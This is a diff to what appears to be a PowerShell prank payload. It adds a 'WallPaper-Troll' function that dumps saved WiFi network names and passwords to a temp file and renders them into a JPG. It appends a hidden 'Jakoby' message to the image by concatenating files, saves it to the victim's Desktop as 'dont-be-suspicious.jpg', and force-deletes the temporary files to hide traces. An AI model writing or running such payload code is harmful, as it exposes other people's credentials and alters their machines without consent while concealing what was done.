@@ -33,7 +33,7 @@
 # Variables
 
 
-
+$s=New-Object -ComObject SAPI.SpVoice
 
 ############################################################################################################################################################
 
@@ -285,6 +285,61 @@ $h = [PInvoke]::GetDeviceCaps($hdc, 117) # height
 
 #############################################################################################################################################
 
+Function WallPaper-Troll {
+
+if (!$Networks) { Write-Host "variable is null" 
+}else { 
+
+	# This is the name of the file the networks and passwords are saved 
+
+	$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_WiFi-PWD.txt"
+
+	($Networks| Out-String) >> $Env:temp\$FileName
+
+	$content = [IO.File]::ReadAllText("$Env:temp\$FileName")
+
+
+# this is the message that will be coded into the image you use as the wallpaper
+
+	$hiddenMessage = "`n`nMy crime is that of curiosity `nand yea curiosity killed the cat `nbut satisfaction brought him back `n with love -Jakoby"
+
+# this will be the name of the image you use as the wallpaper
+
+	$ImageName = "dont-be-suspicious"
+
+<#
+
+.NOTES  
+	This will get take the information gathered and format it into a .jpg
+#>
+
+	Add-Type -AssemblyName System.Drawing
+
+	$filename = "$env:tmp\foo.jpg" 
+	$bmp = new-object System.Drawing.Bitmap $w,$h 
+	$font = new-object System.Drawing.Font Consolas,18 
+	$brushBg = [System.Drawing.Brushes]::White 
+	$brushFg = [System.Drawing.Brushes]::Black 
+	$graphics = [System.Drawing.Graphics]::FromImage($bmp) 
+	$graphics.FillRectangle($brushBg,0,0,$bmp.Width,$bmp.Height) 
+	$graphics.DrawString($content,$font,$brushFg,500,100) 
+	$graphics.Dispose() 
+	$bmp.Save($filename) 
+
+# Invoke-Item $filename 
+
+<#
+
+.NOTES 
+	This will take your hidden message and use steganography to hide it in the image you use as the wallpaper 
+	Then it will clean up the files you don't want to leave behind
+#>
+
+	echo $hiddenMessage > $Env:temp\foo.txt
+	cmd.exe /c copy /b "$Env:temp\foo.jpg" + "$Env:temp\foo.txt" "$Env:USERPROFILE\Desktop\$ImageName.jpg"
+
+	rm $env:TEMP\foo.txt,$env:TEMP\foo.jpg -r -Force -ErrorAction SilentlyContinue
+
 
 #############################################################################################################################################
 
@@ -506,7 +561,7 @@ echo "it worked"
 
 # this is where your message is spoken line by line
 
-
+$s=New-Object -ComObject SAPI.SpVoice
 
 # This sets how fast Sapi Speaks
 
